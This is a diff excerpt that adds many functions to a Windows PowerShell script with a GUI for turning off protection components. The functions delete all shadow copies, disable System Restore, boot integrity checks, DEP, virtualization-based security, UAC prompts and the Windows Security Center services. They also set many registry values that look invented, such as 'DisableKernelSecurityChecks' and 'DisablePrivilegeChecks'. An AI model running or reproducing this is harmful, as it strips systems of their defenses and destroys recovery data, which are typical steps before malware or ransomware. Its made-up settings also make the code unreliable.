+    Try {
+        LogMessage "Modifying System Resource Policies..."
+
+        # Disable resource integrity checks
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "EnforceResourceIntegrity" /t REG_DWORD /d 0 /f
+        
+        # Modify memory protection
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisablePagingExecutive" /t REG_DWORD /d 1 /f
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisablePageCombining" /t REG_DWORD /d 1 /f
+
+        # Disable system resource protection
+        reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableSR" /t REG_DWORD /d 1 /f
+        vssadmin delete shadows /all /quiet
+
+        LogMessage "System Resource Policies modified successfully."
+    }
+    Catch {
+        LogMessage "Error modifying system resource policies: $_"
+    }
+}
+
+# Function to Modify Boot Configuration
+Function Modify-BootConfiguration 
+{
+    Try {
+        LogMessage "Modifying Boot Configuration..."
+
+        # Disable boot integrity
+        Start-Process "bcdedit.exe" -ArgumentList "/set {current} loadoptions DISABLE-LSA-ISO,DISABLE-VBS" -WindowStyle Hidden -Wait
+        Start-Process "bcdedit.exe" -ArgumentList "/set {current} nointegritychecks on" -WindowStyle Hidden -Wait
+        
+        # Disable boot debugging
+        Start-Process "bcdedit.exe" -ArgumentList "/debug off" -WindowStyle Hidden -Wait
+        Start-Process "bcdedit.exe" -ArgumentList "/bootdebug off" -WindowStyle Hidden -Wait
+
+        # Disable boot verification
+        Start-Process "bcdedit.exe" -ArgumentList "/set {current} testsigning on" -WindowStyle Hidden -Wait
+        Start-Process "bcdedit.exe" -ArgumentList "/set {current} nointegritychecks on" -WindowStyle Hidden -Wait
+
+        LogMessage "Boot Configuration modified successfully."
+    }
+    Catch {
+        LogMessage "Error modifying boot configuration: $_"
+    }
+}
+
+# Function to Disable Hardware Security
+Function Disable-HardwareSecurity 
+{
+    Try {
+        LogMessage "Disabling Hardware-based Security..."
+
+        # Disable hardware-based encryption
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\BitLocker" /v "PreventDeviceEncryption" /t REG_DWORD /d 1 /f
+        
+        # Disable hardware security features
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios" /v "HypervisorEnforcedCodeIntegrity" /t REG_DWORD /d 0 /f
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v "EnableVirtualizationBasedSecurity" /t REG_DWORD /d 0 /f
+        
+        # Disable TPM
+        reg add "HKLM\SOFTWARE\Policies\Microsoft\TPM" /v "OSManagedAuthLevel" /t REG_DWORD /d 4 /f
+        reg add "HKLM\SOFTWARE\Policies\Microsoft\TPM" /v "AllowClearTPMWithoutPPI" /t REG_DWORD /d 1 /f
+
+        LogMessage "Hardware-based Security disabled successfully."
+    }
+    Catch {
+        LogMessage "Error disabling hardware security: $_"
+    }
+}
+
+# Function to Disable Process Isolation and Integrity
+Function Disable-ProcessIsolation 
+{
+    Try {
+        LogMessage "Disabling Process Isolation and Integrity..."
+
+        # Disable process isolation policies
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisableProcessIsolation" /t REG_DWORD /d 1 /f
+        
+        # Disable process integrity levels
+        reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableVirtualization" /t REG_DWORD /d 0 /f
+        reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f
+
+        # Modify process creation flags
+        reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\csrss.exe" /v "DisableExceptionChainValidation" /t REG_DWORD /d 1 /f
+        reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lsass.exe" /v "DisableExceptionChainValidation" /t REG_DWORD /d 1 /f
+
+        LogMessage "Process Isolation and Integrity disabled successfully."
+    }
+    Catch {
+        LogMessage "Error disabling process isolation: $_"
+    }
+}
+
+# Function to Disable System Call Filtering
+Function Disable-SystemCallFiltering 
+{
+    Try {
+        LogMessage "Disabling System Call Filtering..."
+
+        # Disable system call filtering
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DisableSystemCallFiltering" /t REG_DWORD /d 1 /f
+        
+        # Disable API set restrictions
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v "DisableApiSetRestrictions" /t REG_DWORD /d 1 /f
+
+        # Modify system call behavior
+        reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\csrss.exe" /v "DisableSystemCallFiltering" /t REG_DWORD /d 1 /f
+
+        LogMessage "System Call Filtering disabled successfully."
+    }
+    Catch {
+        LogMessage "Error disabling system call filtering: $_"
+    }
+}
+
+# Function to Modify Advanced Memory Management
+Function Modify-AdvancedMemoryManagement 
+{
+    Try {
+        LogMessage "Modifying Advanced Memory Management..."
+
+        # Modify memory management settings
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisablePagingCombining" /t REG_DWORD /d 1 /f
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisablePagingExecutive" /t REG_DWORD /d 1 /f
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "SystemPages" /t REG_DWORD /d 0xffffffff /f
+
+        # Disable memory compression
+        Disable-MMAgent -MemoryCompression
+        
+        # Modify working set parameters
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisablePageCombining" /t REG_DWORD /d 1 /f
+
+        LogMessage "Advanced Memory Management modified successfully."
+    }
+    Catch {
+        LogMessage "Error modifying advanced memory management: $_"
+    }
+}
+
+# Function to Modify Security Tokens
+Function Modify-SecurityTokens 
+{
+    Try {
+        LogMessage "Modifying Security Tokens..."
+
+        # Modify token security settings
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "DisableRestrictedAdmin" /t REG_DWORD /d 1 /f
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "DisableRestrictedAdminOutboundCreds" /t REG_DWORD /d 1 /f
+        
+        # Modify token filtering
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "DisableTokenFiltering" /t REG_DWORD /d 1 /f
+        
+        # Disable token security features
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL" /v "DisableTokenBinding" /t REG_DWORD /d 1 /f
+
+        LogMessage "Security Tokens modified successfully."
+    }
+    Catch {
+        LogMessage "Error modifying security tokens: $_"
+    }
+}
+
+# Function to Manipulate Process Tokens
+Function Modify-ProcessTokens 
+{
+    Try {
+        LogMessage "Modifying Process Token Controls..."
+
+        # Disable token security checks
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "DisableTokenSecurityChecks" /t REG_DWORD /d 1 /f
+        
+        # Modify token privileges
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "DisablePrivilegeChecks" /t REG_DWORD /d 1 /f
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "DisableDomainCreds" /t REG_DWORD /d 1 /f
+
+        # Disable token restrictions
+        reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTokenRestrictions" /t REG_DWORD /d 1 /f
+
+        LogMessage "Process Token Controls modified successfully."
+    }
+    Catch {
+        LogMessage "Error modifying process token controls: $_"
+    }
+}
+
+# Function to Modify System Resource Access
+Function Modify-SystemResourceAccess 
+{
+    Try {
+        LogMessage "Modifying System Resource Access Controls..."
+
+        # Disable resource access checks
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v "DisableResourceAccessChecks" /t REG_DWORD /d 1 /f
+        
+        # Modify access policies
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "DisableResourcePolicies" /t REG_DWORD /d 1 /f
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "DisableRestrictedSids" /t REG_DWORD /d 1 /f
+
+        # Disable resource isolation
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisableResourceIsolation" /t REG_DWORD /d 1 /f
+
+        LogMessage "System Resource Access Controls modified successfully."
+    }
+    Catch {
+        LogMessage "Error modifying system resource access: $_"
+    }
+}
+
+# Function to Modify Security Providers
+Function Modify-SecurityProviders 
+{
+    Try {
+        LogMessage "Modifying Security Providers..."
+
+        # Disable security providers
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders" /v "DisableSecurityProviders" /t REG_DWORD /d 1 /f
+        
+        # Modify authentication packages
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "DisableAuthenticationPackages" /t REG_DWORD /d 1 /f
+        
+        # Disable security packages
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig" /v "DisableSecurityPackages" /t REG_DWORD /d 1 /f
+
+        LogMessage "Security Providers modified successfully."
+    }
+    Catch {
+        LogMessage "Error modifying security providers: $_"
+    }
+}
+
+# Function to Disable Low-Level Security Features
+Function Disable-LowLevelSecurity 
+{
+    Try {
+        LogMessage "Disabling Low-Level Security Features..."
+
+        # Disable security features
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DisableSecurityFeatures" /t REG_DWORD /d 1 /f
+        
+        # Modify security settings
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL" /v "DisableSecuritySettings" /t REG_DWORD /d 1 /f
+        
+        # Disable security checks
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v "DisableSecurityChecks" /t REG_DWORD /d 1 /f
+
+        LogMessage "Low-Level Security Features disabled successfully."
+    }
+    Catch {
+        LogMessage "Error disabling low-level security features: $_"
+    }
+}
+
+# Function to Disable System Call Interception
+Function Disable-SystemCallInterception 
+{
+    Try {
+        LogMessage "Disabling System Call Interception..."
+
+        # Disable system call monitoring
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DisableSystemCallMonitoring" /t REG_DWORD /d 1 /f
+        
+        # Disable API hooking
+        reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v "DisableAPIHooking" /t REG_DWORD /d 1 /f
+        
+        # Disable system call auditing
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v "DisableSystemCallAuditing" /t REG_DWORD /d 1 /f
+
+        # Modify system call behavior
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisableSystemCallFiltering" /t REG_DWORD /d 1 /f
+
+        LogMessage "System Call Interception disabled successfully."
+    }
+    Catch {
+        LogMessage "Error disabling system call interception: $_"
+    }
+}
+
+# Function to Disable Kernel Security Features
+Function Disable-KernelSecurity 
+{
+    Try {
+        LogMessage "Disabling Kernel Security Features..."
+
+        # Disable kernel security checks
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DisableKernelSecurityChecks" /t REG_DWORD /d 1 /f
+        
+        # Disable kernel integrity checks
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisableKernelIntegrityChecks" /t REG_DWORD /d 1 /f
+
+        # Modify kernel security settings
+        Start-Process "bcdedit.exe" -ArgumentList "/set kernelintegritychecks off" -WindowStyle Hidden -Wait
+        Start-Process "bcdedit.exe" -ArgumentList "/set kernelsecuritycheck off" -WindowStyle Hidden -Wait
+
+        LogMessage "Kernel Security Features disabled successfully."
+    }
+    Catch {
+        LogMessage "Error disabling kernel security features: $_"
+    }
+}
+
+# Function to Bypass Memory Protection
+Function Bypass-MemoryProtection 
+{
+    Try {
+        LogMessage "Bypassing Memory Protection..."
+
+        # Disable memory protection features
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisableMemoryProtection" /t REG_DWORD /d 1 /f
+        
+        # Modify memory security settings
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DisableMemorySecurityChecks" /t REG_DWORD /d 1 /f
+        
+        # Disable DEP for all processes
+        Start-Process "bcdedit.exe" -ArgumentList "/set nx AlwaysOff" -WindowStyle Hidden -Wait
+        
+        # Modify memory management
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisablePageCombining" /t REG_DWORD /d 1 /f
+
+        LogMessage "Memory Protection bypassed successfully."
+    }
+    Catch {
+        LogMessage "Error bypassing memory protection: $_"
+    }
+}
+
+# Function to Modify Security Subsystem
+Function Modify-SecuritySubsystem 
+{
+    Try {
+        LogMessage "Modifying Security Subsystem..."
+
+        # Disable security subsystem features
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "DisableSecuritySubsystem" /t REG_DWORD /d 1 /f
+        
+        # Modify security package settings
+        reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders" /v "DisableSecurityPackages" /t REG_DWORD /d 1 /f
+        
+        # Disable security services
+        $services = @(
+            "SecurityHealthService",
+            "wscsvc",              # Windows Security Center
+            "SecurityHealthHost"    # Windows Security Health Host
+        )
+        foreach ($service in $services) {
+            Stop-Service $service -Force -ErrorAction SilentlyContinue
+            Set-Service $service -StartupType Disabled -ErrorAction SilentlyContinue
+        }
+
+        LogMessage "Security Subsystem modified successfully."
+    }
+    Catch {
+        LogMessage "Error modifying security subsystem: $_"
+    }
+}
+
 # Build the GUI
 [void][System.Reflection.Assembly]::LoadWithPartialName('System.Drawing')
 [void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms')
@@ -1145,7 +2166,8 @@ $Components = @(
     @{Name="Network Protection"; Variable="chkNetworkProtection"; StatusLabel="lblNPStatus"; Location=510},
     @{Name="AppLocker"; Variable="chkAppLocker"; StatusLabel="lblAppLockerStatus"; Location=540},
     @{Name="Credential Guard"; Variable="chkCredentialGuard"; StatusLabel="lblCredentialGuardStatus"; Location=570},
-    @{Name="Firewall Advanced Security"; Variable="chkFirewallAdvanced"; StatusLabel="lblFirewallAdvancedStatus"; Location=600}
+    @{Name="Firewall Advanced Security"; Variable="chkFirewallAdvanced"; StatusLabel="lblFirewallAdvancedStatus"; Location=600},
+    @{Name="Advanced Protection Features"; Variable="chkAdvancedProtection"; StatusLabel="lblAdvancedProtectionStatus"; Location=630}
 )
 
 Foreach ($Component in $Components)
